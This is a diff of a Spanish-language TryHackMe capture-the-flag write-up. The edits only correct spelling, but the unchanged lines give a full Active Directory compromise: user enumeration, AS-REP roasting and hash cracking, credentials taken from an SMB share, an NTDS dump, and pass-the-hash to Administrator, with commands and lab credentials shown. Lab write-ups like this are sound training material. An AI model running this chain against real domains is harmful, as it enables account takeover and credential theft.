@@ -2,7 +2,7 @@
 Estado: Completado
 Plataforma: Try Hack Me
 SO: Windows
-Dificultad: Medio
+Dificultad: Media
 VectorInicial: AS-REP Roasting
 ServicioInicial: Kerberos
 PuertoInicial: 88
@@ -22,7 +22,7 @@ Tecnicas:
   - SMB Share Enumeration
   - Credential Discovery
   - NTDS Dump
-  - Pass-the-Has
+  - Pass-the-Hash
 Herramientas:
   - gomap
   - enum4linux
@@ -35,7 +35,7 @@ Fecha: 2026-03-15
 ---
 <img width="940" height="257" alt="Pasted image 20260315151219" src="https://github.com/user-attachments/assets/6cf25b5f-b31a-4883-90a3-a079f1b18a20" />
 
-Lo primero que realizaremos sera una enumeración de los puertos abiertos y de los servicios que corren en la maquina.
+Lo primero que realizaremos será una enumeración de los puertos abiertos y de los servicios que corren en la máquina.
 
 ```bash
  gomap -s -p - $TARGET
@@ -85,15 +85,15 @@ Host Exposure Summary
 ✓ Completed scan in 2.27s | hosts: 1 | open ports: 15
 ```
 
-Al ser una maquina de Windows obtendremos muchos puertos abiertos y mas siento un **AD** (Active Directory).
+Al ser una máquina Windows obtendremos muchos puertos abiertos, más aún siendo un **AD** (*Active Directory*).
 
 Los puertos a tener en cuenta son:
 - 80 - Servicio web proporcionado por IIS.
-- 139 - Nombres de maquinas.
-- 445 - Servicio SMB para compartir archivos y mas.
-- 5985 - Winrm para administración remota por linea de comando.
+- 139 - Nombres de máquinas.
+- 445 - Servicio SMB para compartir archivos y más.
+- 5985 - WinRM para administración remota por línea de comandos.
 
-Vamos a proceder a una enumeración de los puertos *139 y 445* con la herramienta **enum4linux**.
+Vamos a proceder a una enumeración de los puertos 139 y 445 con la herramienta **enum4linux**.
 
 ```bash
  enum4linux -U $TARGET
@@ -141,7 +141,7 @@ Domain Sid: S-1-5-21-3591857110-2884097990-301047963
 enum4linux complete on Sun Mar 15 12:26:36 2026
 ```
 
-Con esto hemos conseguido unos posibles usuarios:
+Con esto hemos conseguido algunos posibles usuarios:
 - administrator
 - guest
 - krbtgt
@@ -150,10 +150,10 @@ Con esto hemos conseguido unos posibles usuarios:
 - bin
 - none
 
-Ademas del nombre dominio de la maquina:
+Además del nombre de dominio de la máquina:
 - THM-AD
 
-Para hacer una enumeración mas fina tenemos que añadir a nuestro */etc/host* la **IP** y el nombre de dominio **THM-AD** y **spookysec.local**.
+Para hacer una enumeración más fina tenemos que añadir a nuestro `/etc/hosts` la **IP** y los nombres de dominio **THM-AD** y **spookysec.local**.
 
 ```bash
  sudo nano /etc/hosts
@@ -204,15 +204,15 @@ Version: v1.0.3 (9dad6e1) - 03/15/26 - Ronnie Flathers @ropnop
 2026/03/15 13:18:41 >  Done! Tested 73317 usernames (16 valid) in 288.069 seconds
 ```
 
-Vemos que destacan un par de usuario:
+Vemos que destacan varios usuarios:
 - svc-admin
 - backup
 - administrator
 - Administrator
 
-Pero estos 2 últimos tengo mis dudas con ellos, pero son interesantes.
+Con estos dos últimos tengo mis dudas, pero siguen siendo interesantes.
 
-Ahora pasaremos esta lista a un *txt* para que podamos trabajar bien con ella en las próximas acciones.
+Ahora pasaremos esta lista a un fichero `.txt` para poder trabajar bien con ella en las próximas acciones.
 
 ```txt
 james
@@ -257,9 +257,9 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e1ed5a2a95d2d21abf332b844be2fc7a$3001fd6
 [-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-Con esto obtenemos el has del usuario **svc-admin**.
+Con esto obtenemos el hash del usuario **svc-admin**.
 
-Vamos a proceder a comprometer la contraseña.
+Vamos a proceder a crackear la contraseña.
 
 ```bash
  hashcat -m 18200 scv.admin.txt passwordlist.txt 
@@ -328,7 +328,7 @@ Stopped: Sun Mar 15 13:52:50 2026
 Con esto ya tenemos la combinación para acceder al sistema.
 - svc-admin:management2005
 
-Con estas credenciales podremos enumerar con mas facilidad con las herramientas que tenemos y obtener todos los datos que necesitamos.
+Con estas credenciales podremos enumerar con más facilidad usando las herramientas que tenemos y obtener todos los datos que necesitamos.
 
 ```bash
   smbclient -L //$TARGET -U svc-admin%management2005
@@ -346,7 +346,7 @@ do_connect: Connection to 10.112.160.217 failed (Error NT_STATUS_RESOURCE_NAME_N
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-Con **smbcliente** vemos el listado de recursos compartidos que tiene el servidor y nosotros tenemos acceso a `backup`.
+Con **smbclient** vemos el listado de recursos compartidos que tiene el servidor y comprobamos que tenemos acceso a `backup`.
 
 Veamos que hay dentro.
 
@@ -361,7 +361,7 @@ smb: \> dir
 		8247551 blocks of size 4096. 4305867 blocks available
 ```
 
-Parece que tenemos un fichero interesante en esta carpeta, vamos a descargarla y así tratarla.
+Parece que tenemos un fichero interesante en esta carpeta; vamos a descargarlo para analizarlo.
 
 ```cmd
 smb: \> get backup_credentials.txt
@@ -369,14 +369,14 @@ getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0,3 K
 smb: \> 
 ```
 
-Una vez la tengamos en el equipo podremos decodificar su contenido para ver que hay dentro.
+Una vez lo tengamos en el equipo podremos decodificar su contenido para ver qué hay dentro.
 
 ```bash
  cat backup_credentials.txt | base64 -d          
 backup@spookysec.local:backup2517860   
 ```
 
-Con este nuevo usuario tendremos acceso a mas contenido del servidor ya que por su nombre podemos intuir que nos dará acceso a copias de seguridad de mucho contenido y usuarios.
+Con este nuevo usuario tendremos acceso a más contenido del servidor, ya que por su nombre podemos intuir que nos dará acceso a copias de seguridad de bastante información y usuarios.
 
 Veamos que podemos encontrar.
 
@@ -466,11 +466,11 @@ ATTACKTIVEDIREC$:des-cbc-md5:8604fe2f2a8310fe
 [*] Cleaning up...
 ```
 
-Con esto hemos obtenidos los `hash` de los usuarios y sobre todo del que nos interesa `Adminitrator`.
+Con esto hemos obtenido los `hashes` de los usuarios y, sobre todo, el que nos interesa: `Administrator`.
 
 Sigamos con la intrusión.
 
-Ahora nos conectaremos como el usuario `Adminstrator` usando la herramienta **evil-winrm**.
+Ahora nos conectaremos como el usuario `Administrator` usando la herramienta **evil-winrm**.
 
 ```bash
  evil-winrm -i 10.112.160.217 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
@@ -485,8 +485,8 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
 
-Ahora nos dispondremos a investigar para completar las flags de Try Hack Me para terminar el laboratorio.
+Ahora nos dispondremos a investigar para completar las flags de TryHackMe y terminar el laboratorio.
 
-Pero para ser una intrusión podríamos dejarlo aquí.
+Pero, como intrusión, realmente podríamos dejarlo aquí.
 
-El laboratorio es interesante y se aprende mucho con el.
+El laboratorio es interesante y se aprende bastante con él.
